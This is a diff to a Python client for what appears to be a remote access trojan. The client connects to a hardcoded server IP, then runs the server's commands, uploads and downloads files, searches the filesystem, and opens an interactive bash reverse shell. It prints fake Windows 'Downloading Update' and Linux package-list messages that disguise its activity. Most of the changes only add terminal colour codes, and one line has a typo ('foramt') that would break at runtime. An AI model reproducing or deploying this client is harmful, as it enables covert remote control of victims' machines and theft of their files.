@@ -25,6 +25,20 @@ import getpass
 import sys
 import time
 
+red = '\033[0;31m'  # This will turn terminal output red
+green = '\033[0;32m'  # This will turn terminal output green
+cyan = '\033[1;36m'  # This will turn terminal output cyan
+magenta = '\033[0;35m'  # This will turn terminal output magenta
+yellow = '\033[0;33m'  # This will turn terminal output yellow
+white = '\033[0;37m'  # This will turn terminal output white
+light_red = '\033[0;91m'  # This will turn terminal output light red
+light_green = '\033[0;92m'  # This will turn terminal output light green
+light_yellow = '\033[0;93m'  # This will turn terminal output light yellow
+teal = '\033[0;106m'  # This will turn terminal output light blue
+light_purple = '\033[0;95m'  # This will turn terminal output light purple
+turquoise = '\033[0;96m'  # This will turn terminal output turquoise
+stop = '\033[0m'  # This will return terminal output to its normal color.
+
 # we gather the starting location to use when we search for a file later
 start_loc = os.getcwd()
 
@@ -69,7 +83,7 @@ def download(socket, delimiter):
     :data: the information to send to the server
     """
     # Send the server a message about the file name
-    data = b"[!] Ready for file name."
+    data = "{0}[!]{1} Ready for file name.".format(light_purple, stop).encode()
     mysendall(socket, data, delimiter)
     # Save response from server in variable
     filename = myrecvall(socket, delimiter).decode()
@@ -82,14 +96,14 @@ def download(socket, delimiter):
         # Get the error type for an exception
         typee = str(type(e)).split()[1].split('>')[0]
         # Format the error message and type for sending to the server
-        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e))
+        data = '{0}[!]{3} ERROR TYPE: {1} \n    --ERROR:{2}'.format(light_red, typee, str(e), stop)
         # Encode the message as bytes
         data = data.encode()
         #send the message to the server
         mysendall(socket, data, delimiter)
         # The next three steps are for syncing client/server
         myrecvall(socket, delimiter).decode()
-        data = b'[!] Client download failed'
+        data = '{0}[!]{1} Client download failed'.format(light_red, stop).encode()
         mysendall(socket, data, delimiter)
     else:
         # If no error we will save the base64 encoded file to a variable
@@ -99,7 +113,7 @@ def download(socket, delimiter):
         # Sync with the server to prevent hang in commands
         myrecvall(socket, delimiter).decode()
         # Now we send that it is complete
-        data = b'[!] Client download complete'
+        data = '{0}[!]{1} Client download complete'.format(light_purple, stop).encode()
         mysendall(socket, data, delimiter)
 
 
@@ -119,7 +133,8 @@ def search(socket, delimiter):
                         if found it will provide a md5 hash of the file.
     """
     # tell server we are initializing the search routine
-    mysendall(socket, b'[!] Starting search', delimiter)
+    data = '{}[!]{} Starting Search'.format(magenta, stop).encode()
+    mysendall(socket, data, delimiter)
     # we will check the current directory for the happy_search module
     if 'search' not in os.listdir():
         # now we we add the starting location to path the script is running from
@@ -132,7 +147,7 @@ def search(socket, delimiter):
     # First we will receive the filepath from the server
     filepath = myrecvall(socket, delimiter).decode()
     # Now we will send that we received the file path to start the search
-    data = b'[!] File path received at client'
+    data = '{}[!]{} File path received at client'.format(magenta, stop).encode()
     # Third we call the send function  to send the message
     mysendall(socket, data, delimiter)
     # Now we see if the filename is known or not
@@ -142,7 +157,7 @@ def search(socket, delimiter):
         # send ready for file name, if unknown if will send the 
         # other message
         known = True
-        data = b'[!] Ready for file name'
+        data = '{}[!]{} Ready for file name'.foramt(magenta, stop).encode()
         # We let the server know we are ready for the file name
         mysendall(socket, data, delimiter)
         # We receive, decode, and strip the file name
@@ -152,7 +167,7 @@ def search(socket, delimiter):
         known = False
         name = False
         # We are telling the server that we will use the default regular expression
-        data = b'[!] No file name, using default pattern'
+        data = '{0}[!] No file name, using default pattern{1}'.format(magenta, stop).encode()
         mysendall(socket, data, delimiter)
         # now we sync the server to prevent hanging sockets
         myrecvall(socket, delimiter).decode()
@@ -162,12 +177,12 @@ def search(socket, delimiter):
     except Exception as e:
         # If an exception occurs we send the error to the server
         typee = str(type(e)).split()[1].split('>')[0]
-        data = '[!] ERROR TYPE: {} \n    --ERROR:{}'.format(typee,str(e))
-        mysendall(socket, data.encode(), delimiter)
+        data = '{0}[!]{1} ERROR TYPE: {2} \n    --ERROR:{3}'.format(light_red, stop, typee,str(e)).encode()
+        mysendall(socket, data, delimiter)
         # We receive the server response
         myrecvall(socket, delimiter).decode()
         # Tell the server the the command failed
-        data = b'[!] Client search failed'
+        data = '{0}[!] Client search failed{1}'.format(light_red, stop).encode()
         # Send the fail message
         mysendall(socket, data, delimiter)
     else:
@@ -186,18 +201,18 @@ def search(socket, delimiter):
                 # We sync with the server to prevent a hang after a large file
                 myrecvall(socket, delimiter).decode()
             # Now we tell the server the command is complete
-            data = b'[!] Client search complete'
+            data = '{0}[!]{1} Client search complete'.format(magenta, stop).encode()
             # Send the completion message
             mysendall(socket, data, delimiter)
         else:
             # If there are no results tell the server
-            data = b'[!] No results found'
+            data = '{0}[!]{1} No results found'.format(magenta, stop).encode()
             # Send the message to the client
             mysendall(socket, data, delimiter)
             # Receive the server message
             myrecvall(socket, delimiter).decode()
             # Also tell the server the command is complete
-            data = b'[!] Client search complete'
+            data = '{0}[!]{1} Client search complete'.format(magenta, stop).encode()
             # Send the message to the server
             mysendall(socket, data, delimiter)
 
@@ -209,13 +224,13 @@ def shell(mysocket, delimiter):
     """
     try:
         if sys.platform.startswith('win'):
-            data = b"[!] --HAL9000:I'm sorry I can't do that Dave.\n--Dave: Open the pod bay doors HAL!"
+            data = "{0}[!]{1} --HAL9000:I'm sorry I can't do that Dave.\n--Dave: Open the pod bay doors HAL!".format(light_red, stop).encode()
             mysendall(mysocket, data, delimiter)
             myrecvall(mysocket, delimiter).decode()
-            data = b'[!] We need more lemon pledge'
+            data = '{0}[!]{1} We need more lemon pledge'.format(light_red, stop).encode()
             mysendall(mysocket, data, delimiter)
         elif sys.platform.startswith('linux'):
-            data = b'[!] Client received shell request'
+            data = '{0}[!]{1} Client received shell request'.format(teal, stop).encode()
             mysendall(mysocket, data, delimiter)
             time.sleep(1)
             s = socket.socket()
@@ -227,11 +242,15 @@ def shell(mysocket, delimiter):
             # we call the 
             subprocess.call(['/bin/bash', '-i'])
             myrecvall(mysocket, delimiter)
-            data = b'[!] Client Shell Finished'
+            data = '{0}[!]{1} Client Shell Finished'.format(teal, stop).encode()
             mysendall(mysocket, data, delimiter)
     except Exception as e:
         type_e = str(type(e)).split()[1].split('<')[0]
-        pass
+        data = '{0}[!] Command exception:\n    --ERROR TYPE: {2}\n    --ERROR: {3}{1}'.format(light_red, stop, type_e, str(e)).encode()
+        mysendall(mysocket, data, delimiter)
+        myrecvall(mysocket, delimiter).decode()
+        data = '{}[!] Client command failed.{}'.format(light_red, stop).encode()
+        mysendall(mysocket, data, delimiter)
 
 
 def multi(socket, delimiter):
@@ -259,7 +278,7 @@ def multi(socket, delimiter):
 def commandant(socket, delimiter):
     # Get the username for use later 
     user = getpass.getuser()
-    data = b'[!] Client received command'
+    data = '{0}[!]{1} Client received command'.format(turquoise, stop).encode()
     mysendall(socket, data, delimiter)  
     # Now we get the command from the server
     command = myrecvall(socket, delimiter).decode()
@@ -278,7 +297,7 @@ def commandant(socket, delimiter):
                     commandloc = 'C:\\Users\\{}'.format(user)
         except IndexError as ie:
             # We tell the server we are switching to the default directory
-            data = b'[!] Changing to default directory'
+            data = '{0}[!]{1} Changing to default directory'.format(turquoise, stop).encode()
             mysendall(socket, data, delimiter)  
             # We do a conditional based on the platform the script is running in
             if sys.platform.startswith('linux'):
@@ -289,40 +308,39 @@ def commandant(socket, delimiter):
             # Now we sync the server with the client
             myrecvall(socket, delimiter).decode()  
             # Now we tell the server that it failed
-            data = '\n[!] Changed directory to: {}'.format(os.getcwd())
-            mysendall(socket, data.encode(), delimiter)  
+            data = '{0}[!]{1} Changed directory to: {2}'.format(turquoise, stop, os.getcwd()).encode()
+            mysendall(socket, data, delimiter)  
         except Exception as e:
             # We tell the server there was an error
-            data = '[!] ERROR: ' + str(e)
-            data = data.encode()
+            data = '{0}[!] ERROR: {2}{1}'.format(light_red, stop, str(e)).encode()
             # We send the error to the server
             mysendall(socket, data, delimiter)
             # Now we sync the server with the client
             myrecvall(socket, delimiter).decode()
             # Now we tell the server that it failed
-            data = b'\n[!] Client command failed'
+            data = '{0}[!] Client command failed{1}'.format(light_red, stop).encode()
             mysendall(socket, data, delimiter)
         else:
             # If there is no error
             # We use the change dir command to the specified place
             os.chdir(commandloc)
             # We send back that the dir is changed to the new location
-            data = '[!] Changed directory to: {}'.format(os.getcwd())
-            mysendall(socket, data.encode(), delimiter)
+            data = '{0}[!]{1} Changed directory to: {2}'.format(turquoise, stop, os.getcwd()).encode()
+            mysendall(socket, data, delimiter)
             # Now we sync the information from the server
             myrecvall(socket, delimiter).decode()
             # Now we send that the command is complete
-            data = b'\n[!] Client command complete'
+            data = '{0}[!]{1} Client command complete'.format(turquoise, stop).encode()
             mysendall(socket, data, delimiter)
     elif command[:4] == 'back': # this isn't processing
         # If back command is received tell server
-        data = b'[!] Received back command'
+        data = '{0}[!]{1} Received back command'.format(turquoise, stop).encode()
         # Send received message
         mysendall(socket, data, delimiter)
         # Receive server message
         myrecvall(socket, delimiter)
         # Tell server client is exiting command loop
-        data = b'[!] Exiting command loop'
+        data = '{0}[!]{1} Exiting command loop'.format(turquoise, stop).encode()
         # Send exit message
         mysendall(socket, data, delimiter)
     else: # future shell functionality---
@@ -338,7 +356,7 @@ def commandant(socket, delimiter):
         # Check if our output is empty
         if not len(output):
             # If empty tell the server there is no output
-            output = b'[!] No command output at client'
+            output = '{0}[!]{1} No command output at client'.format(turquoise, stop).encode()
         # combine the bytes objects from the previous steps
         results = output + errors
         # now we send the results to the server
@@ -346,7 +364,7 @@ def commandant(socket, delimiter):
         # now we need to wait for a server next message
         myrecvall(socket, delimiter).decode()
         # now we send that the command completed
-        data = b"[!] Client command complete"
+        data = "{0}[!]{1} Client command complete".format(turquoise, stop).encode()
         mysendall(socket, data, delimiter)
 
 
@@ -362,7 +380,7 @@ def upload(socket, delimiter):
     # First we receive the target filename
     target_name = myrecvall(socket, delimiter).decode().strip()
     # Next we tell the server we are ready for file content
-    data = b'[!] Ready for file contents.'
+    data = '{0}[!]{1} Ready for file contents.'.format(light_purple, stop).encode()
     mysendall(socket, data, delimiter)
     # We save the file contents from the server into a variable
     D_recvd = myrecvall(socket, delimiter).decode()
@@ -374,28 +392,25 @@ def upload(socket, delimiter):
             # We are writing the contents we received earlier
             handle.write(D_recvd)
     except Exception as e:
+        type_e = str(type(e)).split()[1].split('<')[0]
         # send the error or file uploaded
-        data = '[!] ERROR: \n'+str(e)
-        # we encode the error
-        data = data.encode()
+        data = '{0}[!]Upload function error:\n    --ERROR TYPE: {3}\n    --ERROR: \n{2}{1}'.format(light_red, stop, str(e), type_e).encode()
         # we send the error across the socket
         mysendall(socket, data, delimiter)
         # we receive the server message
         myrecvall(socket, delimiter).decode()
         # We send our fail message
-        data = b'[!] Client upload failed'
+        data = '{0}[!] Client upload failed{1}'.format(light_red, stop).encode()
         mysendall(socket, data, delimiter)
     else:
         # If there are no exceptions we tell the server the file was uploaded to the location
-        data = '[!] File uploaded to client at: {}'.format(target_name)
-        # the data must be byte encoded
-        data = data.encode()
+        data = '{0}[!]{1} File uploaded to client at: {2}'.format(light_purple, stop, target_name).encode()
         # now we send our encoded bytes
         mysendall(socket, data, delimiter)
         # We receive the server response
         myrecvall(socket, delimiter).decode()
         # We tell the server that the command is complete
-        data = b'[!] Client upload complete'
+        data = '{0}[!]{1} Client upload complete'.format(light_purple, stop).encode()
         # Now we send command complete to the server
         mysendall(socket, data, delimiter)
 
@@ -466,15 +481,15 @@ def main():
         print("Reading package lists...",end='')
         time.sleep(.1)
     elif sys.platform.startswith('win'):
-        for i in range(1,16):
-            print("Downloading Update {} of 15...".format(i))
-            time.sleep(.4)
-            print("Installing Update {} of 15...".format(i))
-            time.sleep(.7)
+        for i in range(1,9):
+            print("Downloading Update {} of 8...".format(i))
+            time.sleep(random.randint(0,3))
+            print("Installing Update {} of 8...".format(i))
+            time.sleep(random.randint(0,5))
         print('Finalizing Update....')
 
     # This is setting up the client to communicate with the server
-    ip = '192.168.86.27'
+    ip = '192.168.86.26'
     ports = [8888, 7777, 6666, 5555]
     delimiter = b'!!@@##$$!!'
     # This is the socket object that will connect to the server
@@ -511,7 +526,7 @@ def main():
         # If the command is in the breaklist exit the client
         if command.strip() in breaklist:
             # if quit is received break loop and terminate connection to server
-            data = b'[!] Connection terminated at client'
+            data = '{0}[!]{1} Connection terminated at client'.format(white, stop).encode()
             mysendall(mysocket, data, delimiter)
             print('Done')
             break
@@ -531,7 +546,7 @@ def main():
             # go back to beginning of loop
             continue
         elif command[:3] == 'cmd':
-            data = b'[!] Client ready for commands'
+            data = '{0}[!]{1} Client ready for commands'.format(turquoise, stop).encode()
             mysendall(mysocket, data, delimiter)
             ask = myrecvall(mysocket, delimiter).decode()
             if ask.strip() == 's':
